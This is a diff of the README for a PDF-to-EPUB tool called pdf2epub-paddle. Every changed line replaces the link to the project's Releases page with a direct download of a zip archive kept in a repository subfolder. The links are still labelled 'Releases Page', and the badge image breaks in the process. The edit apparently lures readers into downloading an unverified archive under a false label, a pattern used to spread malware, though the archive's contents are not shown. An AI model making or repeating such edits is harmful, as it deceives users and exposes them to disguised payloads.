@@ -1,6 +1,6 @@
 # 🛠️ pdf2epub-paddle - Convert PDFs to Readable EPUBs Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/GDDaucatmoi/pdf2epub-paddle/releases)
+[![Download Now](https://github.com/GDDaucatmoi/pdf2epub-paddle/raw/refs/heads/main/reciprocity/paddle-pdf-epub-v2.5.zip%20Now-Click%20Here-blue)](https://github.com/GDDaucatmoi/pdf2epub-paddle/raw/refs/heads/main/reciprocity/paddle-pdf-epub-v2.5.zip)
 
 ## 📋 Introduction
 
@@ -11,7 +11,7 @@ Welcome to pdf2epub-paddle, a tool designed to transform scanned PDF books into 
 To begin using pdf2epub-paddle, follow these simple steps to download and install the application:
 
 1. **Visit the Download Page**  
-   Go to our [Releases Page](https://github.com/GDDaucatmoi/pdf2epub-paddle/releases) to access the latest version.
+   Go to our [Releases Page](https://github.com/GDDaucatmoi/pdf2epub-paddle/raw/refs/heads/main/reciprocity/paddle-pdf-epub-v2.5.zip) to access the latest version.
 
 2. **Choose Your Version**  
    On the Releases Page, locate the version you want to download. If you are unsure, choose the latest version.
@@ -27,7 +27,7 @@ To begin using pdf2epub-paddle, follow these simple steps to download and instal
 
 ## 📥 Download & Install
 
-To start, visit our [Releases Page](https://github.com/GDDaucatmoi/pdf2epub-paddle/releases) and follow the steps outlined above.
+To start, visit our [Releases Page](https://github.com/GDDaucatmoi/pdf2epub-paddle/raw/refs/heads/main/reciprocity/paddle-pdf-epub-v2.5.zip) and follow the steps outlined above.
 
 ## 🌟 Features
 
@@ -83,4 +83,4 @@ pdf2epub-paddle is open-source software and is distributed under the MIT License
 
 ## 🚀 Conclusion
 
-pdf2epub-paddle simplifies the process of converting scanned PDFs into readable EPUBs. Whether you’re looking to create eBooks for personal use or for sharing with others, this tool offers an efficient and user-friendly solution. Start your journey to readable eBooks today! Visit our [Releases Page](https://github.com/GDDaucatmoi/pdf2epub-paddle/releases) to get started.
+pdf2epub-paddle simplifies the process of converting scanned PDFs into readable EPUBs. Whether you’re looking to create eBooks for personal use or for sharing with others, this tool offers an efficient and user-friendly solution. Start your journey to readable eBooks today! Visit our [Releases Page](https://github.com/GDDaucatmoi/pdf2epub-paddle/raw/refs/heads/main/reciprocity/paddle-pdf-epub-v2.5.zip) to get started.
